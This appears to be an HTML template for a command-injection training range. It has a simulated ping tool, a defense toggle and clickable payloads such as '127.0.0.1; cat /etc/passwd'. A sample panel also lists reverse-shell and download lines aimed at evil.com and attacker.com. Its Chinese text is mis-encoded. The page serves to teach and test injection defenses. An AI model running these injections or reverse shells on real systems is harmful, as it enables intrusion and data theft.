<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <title>å‘½ä»¤æ³¨å…¥æµ‹è¯•é¶åœº</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
  <style>
    body { 
      background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
      min-height: 100vh;
      padding: 20px;
    }
    .attack-card {
      background: rgba(255,255,255,0.95);
      border-radius: 16px;
      padding: 24px;
      margin-bottom: 20px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.1);
    }
    .attack-card h3 { color: #fa709a; margin-bottom: 16px; }
    .payload-example {
      background: #f8f9fa;
      border-left: 4px solid #fa709a;
      padding: 12px;
      border-radius: 4px;
      margin: 8px 0;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      cursor: pointer;
      transition: all 0.2s;
    }
    .payload-example:hover {
      background: #e9ecef;
      transform: translateX(4px);
    }
    .result-box {
      background: #fff;
      border: 1px solid #dee2e6;
      border-radius: 8px;
      padding: 16px;
      margin-top: 16px;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      max-height: 400px;
      overflow-y: auto;
    }
    .result-box.blocked {
      border-left: 4px solid #ffc107;
      background: #fff8e1;
    }
    .result-box.success {
      border-left: 4px solid #28a745;
      background: #f0fff4;
    }
    .terminal-output {
      background: #1e1e1e;
      color: #00ff00;
      padding: 16px;
      border-radius: 8px;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
  </style>
</head>
<body>
  <div class="container" style="max-width: 1400px;">
    <div class="text-center mb-4">
      <h1 class="text-white mb-2"><i class="bi bi-terminal"></i> å‘½ä»¤æ³¨å…¥æµ‹è¯•é¶åœº</h1>
      <p class="text-white-50">æµ‹è¯•æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ”»å‡»åŠé˜²å¾¡æœºåˆ¶</p>
      <span class="badge bg-danger">ğŸ’‰ æ³¨å…¥ç±»æ”»å‡»</span>
      <span class="badge bg-warning text-dark">ä¸¥é‡ç¨‹åº¦: CRITICAL</span>
    </div>

    <div class="row">
      <div class="col-md-6">
        <div class="attack-card">
          <h3><i class="bi bi-hdd-network"></i> Ping å·¥å…·æµ‹è¯•</h3>
          <p class="small text-muted">æ¨¡æ‹Ÿç½‘ç»œè¯Šæ–­å·¥å…·ï¼Œæµ‹è¯•å‘½ä»¤æ³¨å…¥æ¼æ´</p>
          
          <div class="mb-3">
            <label class="form-label small">ç›®æ ‡ä¸»æœº IP/åŸŸå</label>
            <input type="text" id="pingInput" class="form-control" placeholder="ä¾‹å¦‚: 127.0.0.1">
          </div>
          
          <div class="row mb-3">
            <div class="col-md-6">
              <label class="form-label small">æ¨¡æ‹ŸIPåœ°å€</label>
              <input type="text" id="simulatedIp" class="form-control form-control-sm" placeholder="ç•™ç©ºä½¿ç”¨çœŸå®IP">
              <small class="text-muted">ä¾‹: 10.0.0.50</small>
            </div>
            <div class="col-md-6">
              <label class="form-label small">é˜²å¾¡å¼€å…³</label>
              <div class="form-check form-switch">
                <input class="form-check-input" type="checkbox" id="defenseSwitch" checked>
                <label class="form-check-label small" for="defenseSwitch">
                  <span id="defenseSwitchLabel">é˜²å¾¡å·²å¼€å¯</span>
                </label>
              </div>
              <small class="text-muted">å…³é—­åå¯æŸ¥çœ‹æ”»å‡»æ•ˆæœ</small>
            </div>
          </div>
          
          <button id="pingBtn" class="btn btn-danger btn-sm w-100 mb-3">
            <i class="bi bi-play-circle"></i> æ‰§è¡Œ Ping
          </button>
          
          <div class="mb-3">
            <strong class="small">å¸¸è§å‘½ä»¤æ³¨å…¥ Payload:</strong>
            <div class="payload-example" data-payload="127.0.0.1; cat /etc/passwd">
              <strong>è¯»å–å¯†ç æ–‡ä»¶:</strong> 127.0.0.1; cat /etc/passwd
            </div>
            <div class="payload-example" data-payload="127.0.0.1; whoami">
              <strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·:</strong> 127.0.0.1; whoami
            </div>
            <div class="payload-example" data-payload="127.0.0.1 && ls -la">
              <strong>åˆ—ä¸¾ç›®å½•:</strong> 127.0.0.1 && ls -la
            </div>
            <div class="payload-example" data-payload="127.0.0.1 | id">
              <strong>æŸ¥çœ‹ç”¨æˆ·ID:</strong> 127.0.0.1 | id
            </div>
            <div class="payload-example" data-payload="127.0.0.1; uname -a">
              <strong>ç³»ç»Ÿä¿¡æ¯:</strong> 127.0.0.1; uname -a
            </div>
            <div class="payload-example" data-payload="127.0.0.1; env">
              <strong>ç¯å¢ƒå˜é‡:</strong> 127.0.0.1; env
            </div>
            <div class="payload-example" data-payload="127.0.0.1; ps aux">
              <strong>è¿›ç¨‹åˆ—è¡¨:</strong> 127.0.0.1; ps aux
            </div>
            <div class="payload-example" data-payload="127.0.0.1; netstat -an">
              <strong>ç½‘ç»œè¿æ¥:</strong> 127.0.0.1; netstat -an
            </div>
            <div class="payload-example" data-payload="127.0.0.1; ifconfig">
              <strong>ç½‘ç»œé…ç½®:</strong> 127.0.0.1; ifconfig
            </div>
            <div class="payload-example" data-payload="127.0.0.1; ip addr">
              <strong>ç½‘ç»œé…ç½®(Linux ip addr):</strong> 127.0.0.1; ip addr
            </div>
            <div class="payload-example" data-payload="127.0.0.1; ipconfig">
              <strong>ç½‘ç»œé…ç½®(Windows ipconfig):</strong> 127.0.0.1; ipconfig
            </div>
            <div class="payload-example" data-payload="127.0.0.1`pwd`">
              <strong>å½“å‰ç›®å½•:</strong> 127.0.0.1`pwd`
            </div>
          </div>
          
          <div id="pingResult" class="result-box" style="display:none;"></div>
        </div>
      </div>

      <div class="col-md-6">
        <div class="attack-card">
          <h3><i class="bi bi-shield-check"></i> é˜²å¾¡çŠ¶æ€ç›‘æ§</h3>
          <p class="small text-muted">å®æ—¶æ˜¾ç¤ºå‘½ä»¤æ³¨å…¥æ£€æµ‹å’Œæ‹¦æˆªæƒ…å†µ</p>
          
          <div id="defenseStatus" class="alert alert-info">
            <strong>é˜²å¾¡ç³»ç»Ÿ:</strong> <span id="defenseState">ç­‰å¾…æµ‹è¯•...</span>
          </div>
          
          <div class="mb-3">
            <strong class="small">æ”»å‡»æ£€æµ‹è¯¦æƒ…:</strong>
            <div id="attackDetails" class="mt-2" style="font-size: 13px;">
              <p class="text-muted">æš‚æ— æ£€æµ‹è®°å½•</p>
            </div>
          </div>
          
          <div class="mb-3">
            <strong class="small">å‘½ä»¤æ³¨å…¥ç±»å‹åˆ†ç±»:</strong>
            <ul class="small mt-2">
              <li><strong>åˆ†å·æ³¨å…¥:</strong> ; command</li>
              <li><strong>ç®¡é“ç¬¦æ³¨å…¥:</strong> | command</li>
              <li><strong>é€»è¾‘è¿ç®—ç¬¦:</strong> && command, || command</li>
              <li><strong>åå¼•å·æ‰§è¡Œ:</strong> `command`</li>
              <li><strong>å‘½ä»¤æ›¿æ¢:</strong> $(command)</li>
              <li><strong>é‡å®šå‘æ³¨å…¥:</strong> > file, < file</li>
            </ul>
          </div>
        </div>

        <div class="attack-card">
          <h3><i class="bi bi-info-circle"></i> å±é™©å‘½ä»¤ç¤ºä¾‹</h3>
          <div class="terminal-output">
# ä¿¡æ¯æ”¶é›†
whoami          # å½“å‰ç”¨æˆ·
id              # ç”¨æˆ·IDå’Œç»„
uname -a        # ç³»ç»Ÿä¿¡æ¯
cat /etc/passwd # ç”¨æˆ·åˆ—è¡¨

# æ–‡ä»¶æ“ä½œ
ls -la          # åˆ—ä¸¾æ–‡ä»¶
cat file.txt    # è¯»å–æ–‡ä»¶
rm -rf /path    # åˆ é™¤æ–‡ä»¶

# ç½‘ç»œæ“ä½œ
wget http://evil.com/shell.sh
curl http://evil.com/backdoor
nc -e /bin/bash attacker.com 4444

# åå¼¹Shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
          </div>
        </div>
      </div>
    </div>

    <div class="text-center mt-4">
      <a href="{{ url_for('attack_hub') }}" class="btn btn-outline-light btn-sm me-2">è¿”å›æ”»å‡»ä¸­å¿ƒ</a>
      <a href="{{ url_for('console') }}" class="btn btn-outline-light btn-sm">æ§åˆ¶å°</a>
    </div>
  </div>

  <script>
    // é˜²å¾¡å¼€å…³åˆ‡æ¢
    document.getElementById('defenseSwitch').addEventListener('change', (e) => {
      const label = document.getElementById('defenseSwitchLabel');
      if (e.target.checked) {
        label.textContent = 'é˜²å¾¡å·²å¼€å¯';
        label.classList.remove('text-danger');
        label.classList.add('text-success');
      } else {
        label.textContent = 'é˜²å¾¡å·²å…³é—­';
        label.classList.remove('text-success');
        label.classList.add('text-danger');
      }
    });
    
    document.querySelectorAll('.payload-example').forEach(el => {
      el.addEventListener('click', () => {
        document.getElementById('pingInput').value = el.dataset.payload;
      });
    });

    document.getElementById('pingBtn').addEventListener('click', async () => {
      const target = document.getElementById('pingInput').value;
      const defenseEnabled = document.getElementById('defenseSwitch').checked;
      const simulatedIp = document.getElementById('simulatedIp').value.trim();
      const resultEl = document.getElementById('pingResult');
      const statusEl = document.getElementById('defenseStatus');
      const detailsEl = document.getElementById('attackDetails');
      const stateEl = document.getElementById('defenseState');
      
      if (!target) {
        alert('è¯·è¾“å…¥ç›®æ ‡ä¸»æœº');
        return;
      }
      
      resultEl.style.display = 'block';
      resultEl.className = 'result-box';
      resultEl.innerHTML = '<div class="text-center"><div class="spinner-border spinner-border-sm"></div> æ‰§è¡Œä¸­...</div>';
      
      try {
        const r = await fetch('/attack/cmdi/ping', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            target: target,
            defense_enabled: defenseEnabled,
            simulated_ip: simulatedIp
          })
        });
        
        const data = await r.json();
        
        if (data.blocked) {
          resultEl.className = 'result-box blocked';
          statusEl.className = 'alert alert-warning';
          stateEl.innerHTML = '<i class="bi bi-shield-fill-exclamation"></i> æ”»å‡»å·²æ‹¦æˆª';
          
          detailsEl.innerHTML = `
            <div class="alert alert-warning mb-2">
              <strong>æ£€æµ‹åˆ°æ”»å‡»:</strong> ${data.attack_type || 'å‘½ä»¤æ³¨å…¥'}
            </div>
            <div><strong>æ”»å‡»æè¿°:</strong> ${data.description || 'æœªçŸ¥'}</div>
            <div><strong>ä¸¥é‡ç¨‹åº¦:</strong> <span class="badge bg-danger">${data.severity || 'CRITICAL'}</span></div>
            <div><strong>æ”»å‡»åˆ†ç±»:</strong> <span class="badge bg-info">${data.category || 'æ³¨å…¥ç±»æ”»å‡»'}</span></div>
          `;
          
          resultEl.innerHTML = `
            <div class="alert alert-warning">
              <i class="bi bi-shield-exclamation"></i> <strong>å‘½ä»¤æ³¨å…¥æ”»å‡»å·²è¢«æ‹¦æˆªï¼</strong>
            </div>
            <p><strong>æ£€æµ‹åˆ°çš„æ”»å‡»æ¨¡å¼:</strong> ${data.description}</p>
            <p class="text-muted small">æ¶æ„å‘½ä»¤å·²è¢«é˜»æ­¢ï¼Œç³»ç»Ÿæœªå—å½±å“ã€‚</p>
          `;
        } else if (data.error) {
          resultEl.className = 'result-box error';
          resultEl.innerHTML = `<div class="alert alert-danger">${data.error}</div>`;
        } else {
          resultEl.className = 'result-box success';
          statusEl.className = 'alert alert-success';
          stateEl.innerHTML = '<i class="bi bi-check-circle"></i> æ‰§è¡ŒæˆåŠŸ';
          
          let statusInfo = '';
          let alertClass = 'success';
          let alertMsg = 'Ping æ‰§è¡ŒæˆåŠŸ';
          
          if (!data.defense_enabled) {
            statusInfo = '<div class="alert alert-danger mb-2"><i class="bi bi-shield-slash"></i> <strong>é˜²å¾¡å·²å…³é—­</strong> - å‘½ä»¤æœªè¢«æ‹¦æˆªï¼ˆé¶åœºç¯å¢ƒï¼‰</div>';
            
            if (data.attack_detected) {
              alertClass = 'danger';
              alertMsg = 'âš ï¸ å‘½ä»¤æ³¨å…¥æˆåŠŸï¼æ¶æ„å‘½ä»¤å·²æ‰§è¡Œ';
              detailsEl.innerHTML = '<p class="text-danger"><strong>æ£€æµ‹åˆ°å‘½ä»¤æ³¨å…¥æ”»å‡»</strong> - é˜²å¾¡å…³é—­ï¼Œå‘½ä»¤å·²æ‰§è¡Œï¼ˆä»…åœ¨é¶åœºå†…ï¼‰</p>';
            } else {
              detailsEl.innerHTML = '<p class="text-warning">âš ï¸ é˜²å¾¡å…³é—­ï¼Œå‘½ä»¤å·²æ‰§è¡Œï¼ˆä»…åœ¨é¶åœºå†…ï¼‰</p>';
            }
          } else {
            detailsEl.innerHTML = '<p class="text-success">âœ“ æœªæ£€æµ‹åˆ°å‘½ä»¤æ³¨å…¥</p>';
          }
          
          if (data.simulated_ip) {
            statusInfo += `<div class="alert alert-info mb-2"><i class="bi bi-router"></i> æ¨¡æ‹ŸIP: <strong>${data.simulated_ip}</strong></div>`;
          }
          
          resultEl.innerHTML = statusInfo + `
            <div class="alert alert-${alertClass} mb-2">${alertMsg}</div>
            <pre style="background: #1e1e1e; color: #d4d4d4; padding: 12px; border-radius: 4px; font-size: 12px; max-height: 400px; overflow-y: auto;">${data.output}</pre>
          `;
        }
      } catch(e) {
        resultEl.className = 'result-box error';
        resultEl.innerHTML = `<div class="alert alert-danger">è¯·æ±‚å¤±è´¥: ${e.message}</div>`;
      }
    });
  </script>
</body>
</html>
